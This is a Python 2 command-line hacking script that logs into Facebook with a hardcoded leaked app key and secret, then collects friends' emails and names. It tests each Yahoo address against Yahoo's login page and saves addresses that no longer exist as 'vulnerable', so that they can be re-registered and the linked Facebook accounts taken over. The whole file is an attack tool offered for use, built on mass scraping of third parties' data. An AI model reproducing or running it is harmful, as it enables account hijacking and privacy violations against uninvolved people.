# encoding=utf8
# Author: Ao
import requests, json, os, re, sys, mechanize, urllib, hashlib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system("clear")
def about():
    os.system("clear")
    print '''
\033[37m  _____              __       \033[1;32;40m____                    ___
\033[37m / ___/_____ _____  / /____  \033[1;32;40m/ __/_ __ ___  ___  ___ ___ 
\033[37m/ /__/ __/ // / _ \/ __/ _ \\\033[1;32;40m/ _/ \ \ // _ \/ _ \(_-</ -_)
\033[37m\___/_/  \_, / .__/\__/\___\033[1;32;40m/___//_\_\/ .__/\___/___/\__/
\033[37m        /___/_/             \033[1;32;40m        /_/ '\033[39m
'''
    print'''
                    INFORMATION
 ------------------------------------------------------

    \033[1;32;40mAuthor     \033[37mAo
    \033[1;32;40mName       \033[37mAo
    \033[1;32;40mMade for   \033[37mAo
    \033[1;32;40mVersion    \033[37mv 1.0
    \033[1;32;40mDate       \033[37m05/19/2019
    \033[1;32;40mTeam       \033[37mAo
    \033[1;32;40mDiscord    \033[37mAo


* if you find any errors or problems , please contact
  me sa Discord. Please report any bugs.
    
    Credits: wahyuandhika & ciku370
    
'''
    main()
def help():
    os.system('clear')
    print '''
\033[37m  _____              __       \033[1;32;40m____                    ___
\033[37m / ___/_____ _____  / /____  \033[1;32;40m/ __/_ __ ___  ___  ___ ___ 
\033[37m/ /__/ __/ // / _ \/ __/ _ \\\033[1;32;40m/ _/ \ \ // _ \/ _ \(_-</ -_)
\033[37m\___/_/  \_, / .__/\__/\___\033[1;32;40m/___//_\_\/ .__/\___/___/\__/
\033[37m        /___/_/             \033[1;32;40m        /_/ '\033[39m
'''
    print '''
     COMMAND                      DESCRIPTION
  -------------       -------------------------------------

   login              Generate access token
   logout             Remove access token
   show_token         Show Access Token
   
   start              Start scanning for vulnerable friends

   clear              Clear terminal
   help               Show help
   about              Show information about this program
   exit               Exit the program
'''
    main()
def start(token):
    global nama
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
    hasil = json.loads(get_friends.text)
    if 'error' in hasil:
        print '\033[39m[\033[31m+\033[39m] Access Token Expired. Please login Again'
        os.remove('cookie/token.log')
        main()
    print ("\033[39m[\033[31m+\033[39m] Getting friends list...\n")
    global o, h
    o = []
    h = 0
    try:
        os.mkdir('output')
    except OSError:
        pass
    logs=open('output/' + nama.split(' ')[0] + '_vuln.txt','w')
    print "\033[36m" + 91*"-"
    print "\033[36m| " + 14*" " + "\033[35mEmail" + 14*" " + "\033[36m|" + 9*" " + "\033[33mVuln" + 8*" " + "\033[36m|"+ 14*" " + "\033[37mName" + 14*" "+"\033[36m|"
    print "\033[36m" + 91*"-"
    for i in hasil['data']:
        wrna = "\033[36m"
        wrne = "\033[39m"
        h +=1
        o.append(h)
        try:
            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
            z = json.loads(x.text)
        #try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = z['email']
                j = br.submit().read()
                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = 6*" " + "\033[31mNot Vuln"
                    #Email Len
                    lean = 33 - (len(z['email']))
                    eml = lean * " "
                    #Name Len
                    lone = 24 - (len(vuln))
                    namel = lone * " "
                    logs.write('Email: '+z['email']+'\n')
                    logs.write('NOT Vulnerable\n')            
                    logs.write('Name: '+z['name']+'\n')
                    logs.write('-----------------------------------------\n\n')
                    print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m| "+ z['name'] +(31-len(z['name']))*" " + "\033[36m|"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = 8*" " + "\033[32mVuln"
                    v = 1
                else:
                    vuln = 5*" " + "\033[31mNot Vuln"
                    v = 0
                #Email Len
                lean = 33 - (len(z['email']))
                eml = lean * " "
                #Name Len
                lone = 24 - (len(vuln))
                namel = lone * " "
                logs.write('Email: '+z['email']+'\n')
                if v == 1:
                    logs.write("VULNERABLE\n")
                else:
                    logs.write("NOT vulnerable\n")
                logs.write('Name: '+z['name']+'\n')
                logs.write('-----------------------------------------\n\n')
                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel +  " \033[36m| "+ z['name'] +(31-len(z['name']))*" " + "\033[36m|"
            else:
                pass
        except KeyError:
            pass
        except KeyboardInterrupt:
            print "\n\033[39m[\033[31m+\033[39m] Exiting..."
            print '\033[39m[\033[31m+\033[39m] Saving output to output/'+nama.split(' ')[0]+'_vuln.txt\n'
            logs.close()
            main()
        except:
            print '\033[39m[\033[31m+\033[39m] Connection Error!'
            print '\033[39m[\033[31m+\033[39m] Saving output to output/'+nama.split(' ')[0]+'_vuln.txt\n'
            logs.close()
            main()
    print "\n\033[39m[\033[31m+\033[39m] Done!"
    print '\033[39m[\033[31m+\033[39m] Saving output to output/'+nama.split(' ')[0]+'_vuln.txt\n'
    logs.close()
    main()
def get(data):
    global nama
    print '\033[39m[\033[31m+\033[39m] Generating access token... '
    try:
        os.mkdir('cookie')
    except OSError:
        pass
    b = open('cookie/token.log','w')
    try:
        r = requests.get('https://api.facebook.com/restserver.php',params=data)
        a = json.loads(r.text)
        b.write(a['access_token'])
        b.close()
        print '\033[39m[\033[31m+\033[39m] Login Successful'
        print '\033[39m[\033[31m+\033[39m] Access token stored in cookie/token.log'
        x = open('cookie/token.log').read()
        r = requests.get('https://graph.facebook.com/me?access_token='+x)
        a = json.loads(r.text)
        nama = a['name']
        print '\033[39m[\033[31m+\033[39m] Welcome ' + nama +'!'
        main()
    except KeyError:
        print '\033[39m[\033[31m+\033[39m] Failed to generate access token'
        print '\033[39m[\033[31m+\033[39m] Check your connection / email or password'
        try:
            os.remove('cookie/token.log')
        except:
            pass
        main()
    except requests.exceptions.ConnectionError:
        print '\033[39m[\033[31m+\033[39m] Failed to generate access token'
        print '\033[39m[\033[31m+\033[39m] Connection error !!!'
        try:
            os.remove('cookie/token.log')
        except:
            pass
        main()
def login():
    global id
    id = raw_input("\033[39m[\033[31m*\033[39m] Username : ")
    pwd = raw_input("\033[39m[\033[31m*\033[39m] Password : ")
    API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
    data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
    x = hashlib.new('md5')
    x.update(sig)
    data.update({'sig':x.hexdigest()})
    get(data)
def logout():
    try:
        os.remove('cookie/token.log')
        print '\033[39m[\033[31m+\033[39m] Logout Successful'
        print '\033[39m[\033[31m+\033[39m] Access token deleted'
    except OSError:
        print '\033[39m[\033[31m+\033[39m] Logout Failed'
        print '\033[39m[\033[31m+\033[39m] Failed to delete Access token'
    main()
def main():
    try:
        cmd = raw_input('\033[1;32;40mM412x \033[39m>>> ')
        if cmd.lower() == 'login':
            try:
                r = requests.get('https://graph.facebook.com/me?access_token=' + open('cookie/token.log').read())
                a = json.loads(r.text)
                nama = a['name']
                print '\033[39m[\033[31m+\033[39m] ' +a['name'] + ' is already logged in.'
                res = raw_input('\033[39m[\033[31m+\033[39m] Login with a new user [Y/N]: ')
                if res.lower() == 'y':
                    login()
                main()
            except IOError:
                login()
        elif cmd.lower() == 'logout':
            logout()
        elif cmd.lower() == 'exit':
            sys.exit()
        elif cmd.lower() == 'start':
            try:
                open('cookie/token.log')
            except IOError:
                print '\033[39m[\033[31m+\033[39m] Please login first'
                main()
            token=open('cookie/token.log').read()
            start(token)
        elif cmd.lower() == 'show_token':
            try:
                q = open('cookie/token.log','r')
                print '\033[39m[\033[31m+\033[39m] Your access token is: ' + q.read()
            except IOError:
                print '\033[39m[\033[31m+\033[39m] No existing access token'
            main()
        elif cmd.lower() == 'help':
            help()
        elif cmd.lower() == 'about':
            about()
        elif cmd.lower() == 'clear':
            os.system('clear')
            main()
        elif cmd.lower() == '':
            main()
        else:
            print "\033[39m[\033[31m+\033[39m] No command '"+cmd+"' found"
            main()
    except KeyboardInterrupt:
        main()
    except IndexError:
        print '\033[39m[\033[31m+\033[39m] Invalid command : ' + cmd
        main()
if __name__ == '__main__':
    global nama
    print '''
\033[37m  _____              __       \033[1;32;40m____                    ___
\033[37m / ___/_____ _____  / /____  \033[1;32;40m/ __/_ __ ___  ___  ___ ___ 
\033[37m/ /__/ __/ // / _ \/ __/ _ \\\033[1;32;40m/ _/ \ \ // _ \/ _ \(_-</ -_)
\033[37m\___/_/  \_, / .__/\__/\___\033[1;32;40m/___//_\_\/ .__/\___/___/\__/
\033[37m        /___/_/             \033[1;32;40m        /_/ 
'''
    try:
        x = open('cookie/token.log').read()
        r = requests.get('https://graph.facebook.com/me?access_token='+x)
        a = json.loads(r.text)
        if 'error' in hasil:
            main()
        else:
            nama = a['name']
            print '\033[39m[\033[31m+\033[39m] Welcome ' + nama +'!'
    except IOError:
        nama = ''
        pass
    except:
        nama = ''
    main()
